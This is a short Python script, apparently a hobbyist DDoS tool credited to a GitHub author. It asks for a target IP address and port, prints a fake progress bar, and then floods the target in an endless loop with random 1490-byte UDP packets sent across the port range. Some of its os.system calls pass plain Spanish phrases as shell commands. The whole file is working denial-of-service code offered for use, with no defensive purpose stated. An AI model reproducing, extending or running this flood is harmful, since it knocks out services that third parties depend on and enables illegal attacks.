import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system(" DDos script")
print("Author   : d4n7.dev")
print("GitHub   : https://github.com/dannyaguilargil")
print()

#entrada
ip = input("IP Target : ")
port = int(input("Port       : "))

# Progreso del ataque
os.system("limpieza")
os.system("iniciando ataque...")
print("[                    ] 0%")
time.sleep(2)
print("[=====               ] 25%")
time.sleep(2)
print("[==========          ] 50%")
time.sleep(2)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(1)

# Bucle del ataque
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print(f"Sent {sent} packet(s) to {ip} through port {port}")
    if port == 65534:
        port = 1
